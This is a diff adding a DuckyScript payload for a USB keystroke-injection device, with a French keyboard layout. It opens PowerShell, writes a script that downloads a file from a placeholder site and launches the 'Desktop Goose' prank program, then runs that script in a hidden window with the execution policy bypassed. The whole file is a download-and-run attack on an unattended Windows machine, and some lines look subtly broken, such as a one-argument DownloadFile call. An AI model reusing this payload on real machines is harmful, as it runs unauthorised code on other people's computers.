@@ -1,0 +1,20 @@
+LOCALE FR
+GUI r
+DELAY 200
+STRING powershell.exe
+ENTER
+DELAY 2000
+STRING echo '(New-Object Net.WebClient).DownloadFile("%%site%%")' >> g.ps1
+ENTER
+DELAY 300
+STRING echo ./goose.exe >> g.ps1
+ENTER
+DELAY 300
+STRING echo "cd '.\DesktopGoose v0.3'" >> g.ps1
+ENTER
+DELAY 300
+STRING echo "./GooseDesktop.exe" >> g.ps1
+ENTER
+DELAY 300
+STRING powershell.exe -WindowStyle Hidden -exec bypass ./g.ps1
+ENTER
